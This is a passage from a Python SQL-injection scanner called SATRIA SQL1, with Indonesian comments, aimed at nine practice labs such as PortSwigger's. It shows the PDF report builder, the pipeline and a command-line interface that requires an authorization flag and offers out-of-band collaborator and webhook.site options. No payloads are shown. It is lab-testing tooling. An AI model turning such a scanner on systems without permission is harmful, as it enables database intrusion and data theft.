    doc.rect(0, _PDF_H - 128, _PDF_W, 128, _PDF_COLORS["navy"])
    doc.rect(0, _PDF_H - 136, _PDF_W, 8, _PDF_COLORS["teal"])
    doc.text(_PDF_MARGIN, _PDF_H - 58, "SATRIA SQL1", 25, _PDF_COLORS["white"], bold=True)
    doc.text(_PDF_MARGIN, _PDF_H - 80, "LAPORAN PERBAIKAN 9 LAB SQL INJECTION", 11.5,
             _PDF_COLORS["light"], bold=True)
    doc.text(_PDF_MARGIN, _PDF_H - 98, "login bypass - Oracle listing - UNION - blind - error - OOB",
             9.0, _PDF_COLORS["light"])
    doc.y = _PDF_H - 162
    doc.paragraph(_PDF_MARGIN, _PDF_W - 2 * _PDF_MARGIN, f"Target: {target}", 9.5,
                  _PDF_COLORS["text"], bold=True)
    doc.paragraph(_PDF_MARGIN, _PDF_W - 2 * _PDF_MARGIN,
                  f"Hasil: {summary.get('confirmed', 0)} dari 9 lab terkonfirmasi; "
                  f"{summary.get('not_confirmed', 0)} belum terkonfirmasi. "
                  f"Permintaan HTTP: {stats.get('requests', 0)}; durasi {stats.get('elapsed_seconds', 0)} s.",
                  9.0, _PDF_COLORS["muted"])
    doc.paragraph(_PDF_MARGIN, _PDF_W - 2 * _PDF_MARGIN, f"Dihasilkan: {generated or '-'}", 8.5,
                  _PDF_COLORS["muted"])

    # Tabel ringkas
    doc.y -= 14
    doc.ensure(40)
    columns = (64.0, 74.0, 52.0, 313.0)
    headers = ("Lab", "Status", "Severity", "Judul")
    x_positions: list[float] = []
    cursor = _PDF_MARGIN
    for width in columns:
        x_positions.append(cursor)
        cursor += width
    header_top = doc.y
    doc.rect_top(_PDF_MARGIN, header_top, _PDF_W - 2 * _PDF_MARGIN, 19, _PDF_COLORS["navy"])
    for index, header in enumerate(headers):
        doc.text(x_positions[index] + 5, header_top - 13, header, 8.0, _PDF_COLORS["white"], bold=True)
    doc.y -= 19
    for row_index, item in enumerate(labs):
        cells = (
            item.get("id", ""),
            "CONFIRMED" if item.get("status") == "confirmed" else "OPEN",
            str(item.get("severity", "")).upper(),
            item.get("title", ""),
        )
        wrapped = [doc.wrap(cell, columns[idx] - 10, 8.0) for idx, cell in enumerate(cells)]
        row_height = max(len(lines) for lines in wrapped) * 10.0 + 8
        doc.ensure(row_height + 4)
        if row_index % 2 == 0:
            doc.rect_top(_PDF_MARGIN, doc.y, _PDF_W - 2 * _PDF_MARGIN, row_height, _PDF_COLORS["light"])
        for idx, lines in enumerate(wrapped):
            color = _PDF_COLORS["text"]
            if idx == 1:
                color = _PDF_COLORS["green"] if item.get("status") == "confirmed" else _PDF_COLORS["amber"]
            for line_index, line in enumerate(lines):
                doc.text(x_positions[idx] + 5, doc.y - 10 - line_index * 10.0, line, 8.0,
                         color, bold=(idx in (0, 1)))
        doc.y -= row_height
        doc.line(_PDF_MARGIN, doc.y, _PDF_W - _PDF_MARGIN, doc.y, _PDF_COLORS["line"])

    # Detail bukti
    doc.y -= 22
    doc.ensure(40)
    doc.text(_PDF_MARGIN, doc.y - 14, "Detail bukti temuan terkonfirmasi", 13,
             _PDF_COLORS["navy"], bold=True)
    doc.y -= 26
    confirmed = [item for item in labs if item.get("status") == "confirmed"]
    if not confirmed:
        doc.paragraph(_PDF_MARGIN, _PDF_W - 2 * _PDF_MARGIN,
                      "Tidak ada lab yang terkonfirmasi pada putaran ini.", 9.0,
                      _PDF_COLORS["muted"])
    for item in confirmed:
        title_lines = doc.wrap(item.get("title", ""), _PDF_W - 2 * _PDF_MARGIN - 16, 10.0)
        method_lines = doc.wrap(f"Metode: {item.get('method', '-')}", _PDF_W - 2 * _PDF_MARGIN - 16, 8.6)
        location_lines = doc.wrap(f"Lokasi: {item.get('location', '-')}", _PDF_W - 2 * _PDF_MARGIN - 16, 8.6)
        evidence_lines = doc.wrap(f"Bukti: {item.get('evidence', '-')}", _PDF_W - 2 * _PDF_MARGIN - 16, 8.6)
        block_height = 30 + len(title_lines) * 13 + (len(method_lines) + len(location_lines) + len(evidence_lines)) * 11 + 12
        doc.ensure(block_height)
        top = doc.y
        doc.rect_top(_PDF_MARGIN, top, _PDF_W - 2 * _PDF_MARGIN, block_height, _PDF_COLORS["white"])
        doc.rect_top(_PDF_MARGIN, top, 4, block_height, _PDF_COLORS["green"])
        cursor_y = top - 15
        doc.text(_PDF_MARGIN + 12, cursor_y, item.get("id", ""), 8.0, _PDF_COLORS["muted"], bold=True)
        cursor_y -= 15
        for line in title_lines:
            doc.text(_PDF_MARGIN + 12, cursor_y, line, 10.0, _PDF_COLORS["navy"], bold=True)
            cursor_y -= 13
        for lines in (method_lines, location_lines, evidence_lines):
            for line in lines:
                doc.text(_PDF_MARGIN + 12, cursor_y, line, 8.6, _PDF_COLORS["text"])
                cursor_y -= 11
        doc.line(_PDF_MARGIN, top - block_height, _PDF_W - _PDF_MARGIN, top - block_height,
                 _PDF_COLORS["line"])
        doc.y = top - block_height - 12

    # Header/footer semua halaman
    for index, ops in enumerate(doc.pages, start=1):
        ops.append(f"{_pdf_rgb(_PDF_COLORS['navy'])} rg 0 {_pdf_num(_PDF_H - 24)} {_pdf_num(_PDF_W)} 24 re f")
        ops.append(
            f"BT /F2 7.5 Tf {_pdf_rgb(_PDF_COLORS['white'])} rg {_pdf_num(_PDF_MARGIN)} "
            f"{_pdf_num(_PDF_H - 16)} Td (SATRIA SQL1 - 9 Lab SQL Injection) Tj ET"
        )
        ops.append(
            f"BT /F1 7.2 Tf {_pdf_rgb(_PDF_COLORS['muted'])} rg {_pdf_num(_PDF_MARGIN)} 34 Td "
            f"({_pdf_escape(snippet(target, 90))}) Tj ET"
        )
        ops.append(
            f"BT /F1 7.2 Tf {_pdf_rgb(_PDF_COLORS['muted'])} rg {_pdf_num(_PDF_W - 90)} 34 Td "
            f"(Halaman {index}) Tj ET"
        )

    page_refs = [f"{5 + 2 * i} 0 R" for i in range(len(doc.pages))]
    objects: list[bytes] = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        (f"<< /Type /Pages /Kids [{' '.join(page_refs)}] /Count {len(doc.pages)} >>").encode(),
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>",
    ]
    for index, ops in enumerate(doc.pages):
        page_no = 5 + 2 * index
        content_no = 6 + 2 * index
        stream = ("\n".join(ops) + "\n").encode("latin-1", errors="replace")
        objects.append(
            (
                f"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 {_pdf_num(_PDF_W)} {_pdf_num(_PDF_H)}] "
                f"/Resources << /Font << /F1 3 0 R /F2 4 0 R >> >> /Contents {content_no} 0 R >>"
            ).encode()
        )
        objects.append(b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" + stream + b"\nendstream")

    output = bytearray(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
    offsets: list[int] = []
    for object_index, body in enumerate(objects, start=1):
        offsets.append(len(output))
        output.extend(f"{object_index} 0 obj\n".encode())
        output.extend(body)
        output.extend(b"\nendobj\n")
    xref = len(output)
    output.extend(f"xref\n0 {len(objects) + 1}\n".encode())
    output.extend(b"0000000000 65535 f \n")
    for offset in offsets:
        output.extend(f"{offset:010d} 00000 n \n".encode())
    output.extend(
        f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
    )
    target_path.write_bytes(bytes(output))
    if target_path.stat().st_size < 1000:
        padding = b"%" + b" " * (1000 - target_path.stat().st_size - 2) + b"\n"
        with target_path.open("ab") as handle:
            handle.write(padding)
    return target_path


# ---------------------------------------------------------------------------
# Integrasi pipeline + CLI
# ---------------------------------------------------------------------------
_RUNTIME: dict[str, Any] = {}


def configure_runtime(**overrides: Any) -> dict[str, Any]:
    for key, value in overrides.items():
        if value is not None:
            _RUNTIME[key] = value
    return dict(_RUNTIME)


def _scrape_url(scrape_data: dict[str, Any] | None) -> str | None:
    if not isinstance(scrape_data, dict):
        return None
    meta = scrape_data.get("meta") if isinstance(scrape_data.get("meta"), dict) else {}
    for key in ("url", "final_url", "returned_url"):
        value = meta.get(key)
        if isinstance(value, str) and value.strip():
            return value.strip()
    for container in (scrape_data, scrape_data.get("data") if isinstance(scrape_data.get("data"), dict) else {}):
        for key in ("url", "target"):
            value = container.get(key)
            if isinstance(value, str) and value.strip():
                return value.strip()
    return None


def run_pipeline(
    scrape_data: dict[str, Any] | None = None,
    *,
    url: str | None = None,
    authorized: bool | None = None,
    output_dir: str | Path | None = None,
    pdf_path: str | Path | None = None,
    **runtime_options: Any,
) -> dict[str, Any]:
    """Jalur programatik: pindai lalu tulis JSON/HTML/PDF untuk 9 lab ini."""
    if runtime_options:
        configure_runtime(**runtime_options)
    target = url or _scrape_url(scrape_data)
    if not target:
        raise RuntimeError("URL target tidak ditemukan; isi url=... atau scrape_data.")
    allowed = authorized if authorized is not None else bool(_RUNTIME.get("authorized"))
    if not allowed:
        raise RuntimeError("Pemindaian aktif memerlukan authorized=True.")
    report = scan_target(
        target,
        authorized=True,
        allow_private=bool(_RUNTIME.get("allow_private", False)),
        oob_domain=_RUNTIME.get("oob_domain") or os.getenv("SATRIA_OOB_DOMAIN") or None,
        oob_poll_url=_RUNTIME.get("oob_poll_url") or os.getenv("SATRIA_OOB_POLL_URL") or None,
        oob_webhook_site=bool(_RUNTIME.get("oob_webhook_site", False)),
        oob_wait=float(_RUNTIME.get("oob_wait", 20.0)),
    )
    result: dict[str, Any] = {
        "target": report.get("target", target),
        "generated_at": report.get("generated_at"),
        "mode": "active",
        "labs": report.get("labs", []),
        "report": report,
        "summary": report.get("summary", {}),
        "errors": report.get("scan_stats", {}).get("errors", []),
    }
    directory = Path(output_dir or OUTPUT_DIR)
    json_path, html_path = write_report(report, directory)
    result["json_path"] = str(json_path)
    result["html_path"] = str(html_path)
    result["pdf_path"] = str(render_pdf(result, str(pdf_path or (directory / "laporan_sql1.pdf"))))
    return result


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description="SATRIA SQL1 - pemindai 9 lab SQL injection (login, Oracle, UNION, blind, error, OOB)",
    )
    parser.add_argument("target", nargs="?", help="URL target http(s), mis. instance lab PortSwigger")
    parser.add_argument("--authorized", action="store_true", help="Wajib: Anda menyatakan memiliki izin pengujian.")
    parser.add_argument("--allow-private", action="store_true", help="Izinkan localhost/private (uji lokal).")
    parser.add_argument("--max-pages", type=int, default=25)
    parser.add_argument("--max-points", type=int, default=16)
    parser.add_argument("--max-requests", type=int, default=900)
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--oob-domain", default=os.getenv("SATRIA_OOB_DOMAIN"),
                        help="Domain collaborator (mis. xxxx.oastify.com).")
    parser.add_argument("--oob-poll-url", default=os.getenv("SATRIA_OOB_POLL_URL"),
                        help="Endpoint JSON polling interaksi collaborator.")
    parser.add_argument("--oob-webhook-site", action="store_true",
                        help="Buat token webhook.site otomatis untuk OOB.")
    parser.add_argument("--oob-wait", type=float, default=20.0,
                        help="Detik menunggu interaksi OOB (default 20).")
    parser.add_argument("--output-dir", default=OUTPUT_DIR)
    parser.add_argument("--pdf", default=None, help="Path PDF keluaran (default: <output-dir>/laporan_sql1.pdf).")
    args = parser.parse_args(argv)
    if not args.target:
        parser.error("URL target wajib diisi.")
    if not args.authorized:
        parser.error("Pengujian aktif memerlukan --authorized.")
    try:
        report = scan_target(
            args.target,
            authorized=True,
            allow_private=args.allow_private,
            max_pages=args.max_pages,
            max_points=args.max_points,
            max_requests=args.max_requests,
            timeout=args.timeout,
            oob_domain=args.oob_domain,
            oob_poll_url=args.oob_poll_url,
            oob_webhook_site=args.oob_webhook_site,
            oob_wait=args.oob_wait,
        )
    except Exception as exc:
        print(f"[error] {type(exc).__name__}: {exc}", file=sys.stderr)
        return 1
    output_dir = Path(args.output_dir)
    json_path, html_path = write_report(report, output_dir)
    result = {
        "target": report.get("target"),
        "generated_at": report.get("generated_at"),
        "mode": "active",
        "labs": report.get("labs", []),
        "report": report,
        "summary": report.get("summary", {}),
        "errors": report.get("scan_stats", {}).get("errors", []),
    }
    pdf_path = render_pdf(result, args.pdf or str(output_dir / "laporan_sql1.pdf"))
    summary = report.get("summary", {})
    print(f"SATRIA SQL1 selesai: {summary.get('confirmed', 0)}/9 terkonfirmasi, "
          f"{summary.get('not_confirmed', 0)} belum terkonfirmasi "
          f"({report.get('scan_stats', {}).get('requests', 0)} permintaan).")
    for item in report.get("labs", []):
        flag = "OK  " if item.get("status") == "confirmed" else "OPEN"
        print(f"  [{flag}] {item.get('id')} - {item.get('method')}")
    print(f"JSON: {json_path}")
    print(f"HTML: {html_path}")
    print(f"PDF : {pdf_path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
